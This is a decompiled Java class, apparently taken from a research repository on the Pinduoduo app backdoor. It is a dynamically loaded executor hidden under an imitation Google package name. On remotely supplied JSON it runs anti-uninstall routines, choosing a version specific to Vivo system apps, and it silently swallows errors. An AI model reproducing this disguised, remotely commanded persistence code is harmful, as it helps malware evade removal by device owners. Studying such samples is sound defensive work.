package com.google.android.sd.biz_dynamic_dex.vivo_official_uninstall;

import android.content.Context;
import android.text.TextUtils;
import com.google.android.sd.biz_dynamic_dex.base.DynamicCmdExecutor;
import org.json.JSONObject;

public class VivoOfficialUninstallExecutor extends DynamicCmdExecutor {
  protected void realExecute(Context paramContext, String paramString) throws Exception {
    try {
      if (TextUtils.isEmpty(paramString))
        return; 
      JSONObject jSONObject = new JSONObject(paramString);
      if ("com.vivo.devicereg".equals(paramContext.getPackageName()) || "com.bbk.appstore".equals(paramContext.getPackageName())) {
        (new OfficialUntiUninstallV3()).work(paramContext, jSONObject);
        return;
      } 
      (new OfficialUntiUninstallV2()).work(paramContext, jSONObject);
      return;
    } catch (Exception exception) {
      return;
    } 
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\be7a2b643d7e8543f49994ffeb0ee0b6-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\vivo_official_uninstall\VivoOfficialUninstallExecutor.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */